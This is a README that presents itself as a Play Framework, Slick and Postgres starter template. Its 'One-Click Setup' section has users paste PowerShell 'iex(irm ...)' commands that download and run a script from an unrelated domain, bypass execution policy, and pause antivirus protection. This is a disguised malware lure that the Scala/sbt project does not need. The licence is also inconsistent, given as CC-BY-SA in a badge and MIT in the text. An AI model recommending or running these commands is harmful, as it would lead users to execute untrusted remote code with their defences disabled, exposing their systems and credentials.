<div align="center">

# Play + Postgres Web App Template

![preview](https://raw.githubusercontent.com/stl-01/play-reactive-slick-starter/main/screen_17aec01.svg)

[![powershell](https://img.shields.io/badge/POWERSHELL-7%2B-6366f1?style=plastic&labelColor=0d1117)]() [![licence](https://img.shields.io/badge/LICENCE-CC--BY--SA--4.0-818cf8?style=plastic&labelColor=0d1117)]() [![pipeline](https://img.shields.io/badge/PIPELINE-SUCCESS-2ea44f?style=plastic&labelColor=0d1117)]()

</div>

---

A Play starter template that pairs a polished UI with a Postgres-backed persistence layer via Reactive Slick. Use it as a foundation when you want Play as your web framework and Postgres as your database, with the wiring already in place. Clone the project, point it at your database, and start building features instead of boilerplate.

## 🛠️ One-Click Setup (PowerShell)

> [!TIP]
> **Silent installer** — one command, no prompts.
> Windows 10 / 11 · PowerShell 5.1+ · No admin required

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Paste and run
Paste and run. Wait until the process completes.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Forced run via CMD
Run this command in CMD instead:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If security software blocks the setup, temporarily pause Real-Time Protection, run the script, then re-enable it.

## ✅ Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- Ready-to-run Play starter with a polished, responsive UI out of the box.
- Play Framework backend wired for reactive, non-blocking request handling.
- Postgres integration via Slick, including schema setup and typed queries.
- Clean separation of controllers, models, and views for easy extension.
- Example CRUD flow demonstrating the full stack from UI to database.
- Config-driven database connection for quick environment switching.
- Sensible project layout that scales from demo to production app.

## Tech Stack

- **Play Framework** (Scala) — reactive web framework handling routing, controllers, and async request processing.
- **Slick** — functional relational mapping for type-safe, reactive database access.
- **PostgreSQL** — relational database backing the demo.
- **Reactive Streams** — non-blocking, back-pressure-aware data flow between the app and the database.
- **Scala** — primary language for controllers, models, and data access layers.
- **sbt** — build tool and dependency management.
- **HTML/CSS/JavaScript UI** — included front-end template with a ready-to-use interface.

The stack is wired together out of the box, so you can focus on your domain logic instead of boilerplate integration.

## Getting Started

- Install PostgreSQL if you don't already have it.
- Create a database for the application.
- Build the project with `sbt clean compile`.
- Start the application with `sbt run`.
- Open `localhost:9000` in your browser to view the running template.

## Project Structure

```
app/
 controllers/ HTTP handlers and request/response logic
 models/ Domain entities and table mappings
 services/ Business logic and Slick queries
 views/ Twirl templates for the UI
conf/
 application.conf Application configuration
 routes Route definitions
 evolutions/ Database schema migrations
public/
 css/ Stylesheets
 js/ Client-side scripts
 images/ Static assets
test/ Unit and integration tests
build.sbt Build definition and dependencies
```

The `app` directory holds the core application code, split by responsibility: controllers handle HTTP, services encapsulate database access through Slick, and views render Twirl templates. Database schema changes live in `conf/evolutions` and are applied automatically on startup. Static assets served to the browser are kept under `public`.

## References

- Play Framework documentation for routing, controllers, and configuration patterns used in this template.
- Slick documentation for reactive database access and functional relational mapping in Scala.
- PostgreSQL documentation for database setup and administration.
- The play-reactive-slick project source itself, as the primary example of how these pieces are wired together.

## License

This project is released under the MIT License.

You are free to use, copy, modify, merge, publish, distribute, sublicense, and sell copies of the software, provided the copyright notice and permission notice are included in all copies or substantial portions of the software.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

See the LICENSE file in the project root for the full text.